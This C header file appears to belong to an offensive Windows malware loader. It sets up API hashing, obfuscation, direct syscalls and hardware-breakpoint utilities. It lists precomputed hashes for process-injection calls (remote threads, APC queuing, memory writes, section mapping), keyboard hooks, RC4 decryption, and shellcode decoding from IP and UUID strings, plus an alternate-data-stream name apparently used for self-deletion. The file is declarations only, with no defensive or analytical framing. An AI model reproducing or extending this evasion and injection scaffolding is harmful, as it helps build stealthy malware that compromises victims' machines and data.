#pragma once

//----------------------------------------
// Section: Configuration & Dependencies
//----------------------------------------
#include "config.h"
#include "constants.h"
#include "structs.h"
#include "utils/api_hashing.h"
#include "utils/asm_utils.h"
#include "utils/obfuscation.h"
#include "utils/peb_utils.h"
#include "utils/hardware_breakpoints.h"
#include "syscalls/syscalls.h"

//----------------------------------------
// Section: Platform-Specific Headers
//----------------------------------------
#if defined(DEBUG) && !defined(NO_CRT_LIB)
#include <stdio.h>
#endif

#ifndef SYSCALL_ENABLED
#include <windows.h>
#include <bcrypt.h>
#endif

//----------------------------------------
// Section: API Hashing Functions
//----------------------------------------
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR  String);

#define INITIAL_SEED 8
#define HASHA(API)   (HashStringJenkinsOneAtATime32BitA((PCHAR)API))
#define HASHW(API)   (HashStringJenkinsOneAtATime32BitW((PWCHAR)API))

#define NtQuerySystemInformation_HASH       0x7B9816D6
#define NtCreateSection_HASH                0x192C02CE
#define NtMapViewOfSection_HASH             0x91436663
#define NtUnmapViewOfSection_HASH           0x0A5B9402
#define NtClose_HASH                        0x369BD981
#define NtCreateThreadEx_HASH               0x8EC0B84A
#define NtWaitForSingleObject_HASH          0x6299AD3D
#define NtDelayExecution_HASH               0xB947891A
#define NtAllocateVirtualMemory_HASH        0x6E8AC28E
#define NtWriteVirtualMemory_HASH           0x319F525A
#define NtProtectVirtualMemory_HASH         0x1DA5BB2B
#define NtFreeVirtualMemory_HASH            0x95687873
#define NtQueueApcThread_HASH               0xEB15EA8A
#define NtOpenProcess_HASH                  0x837FAFFE
#define NtOpenSection_HASH                  0x0C31B099
#define NtResumeThread_HASH                 0x13684121
#define NtCreateUserProcess_HASH            0xAB7CAA87
#define NtReadVirtualMemory_HASH            0x487E6470
#define GetTickCount64_HASH                 0x00BB616E
#define OpenProcess_HASH                    0xAF03507E
#define CallNextHookEx_HASH                 0xB8B1ADC1
#define SetWindowsHookExW_HASH              0x15580F7F
#define GetMessageW_HASH                    0xAD14A009
#define DefWindowProcW_HASH                 0xD96CEDDC
#define UnhookWindowsHookEx_HASH            0x9D2856D0
#define GetModuleFileNameW_HASH             0xAB3A6AA1
#define SetFileInformationByHandle_HASH     0x6DF54277
#define CreateFileW_HASH                    0xADD132CA
#define CreateRemoteThread_HASH             0x9E1F5A2B
#define CreateFileMapping_HASH              0x8D4C3A2F
#define CreateFileMappingW_HASH             0x7B2E6D1A
#define SetFileInformationByHandle_HASH     0x6DF54277
#define CloseHandle_HASH                    0x9E5456F2
#define SystemFunction032_HASH              0x8CFD40A8
#define WaitOnAddress_HASH                  0x40D96258
#define RtlIpv4StringToAddressA_HASH        0x08526415
#define RtlIpv6StringToAddressA_HASH        0x9376929B
#define RtlEthernetStringToAddressA_HASH    0x12404322
#define UuidFromStringA_HASH                0xDBAF006B
#define RtlAllocateHeap_HASH                0x23FEEC41
#define RtlDestroyProcessParameters_HASH    0x8DF6FBC0
#define RtlCreateProcessParametersEx_HASH   0x55B87410
#define EnumProcessModulesEx_HASH           0x003E9187
#define GetModuleBaseNameA_HASH             0x02B6809D
#define NTDLLDLL_HASH                       0x0141C4EE
#define KERNEL32DLL_HASH                    0xFD2AD9BD
#define USER32DLL_HASH                      0x349D72E7
#define ADVAPI32DLL_HASH                    0xD675A2CB
#define RPCRT4DLL_HASH                      0x256E8F49
#define Process32FirstW_HASH                0xF49D8F09
#define Process32NextW_HASH                 0xF57761DC
#define VirtualAllocEx_HASH                 0xAD56CE7E
#define VirtualProtectEx_HASH               0xE7C5793F
#define WriteProcessMemory_HASH             0xFD7C9237

//----------------------------------------
// Section: Miscellaneous Macros
//----------------------------------------
#define NEW_STREAM L":Delete"
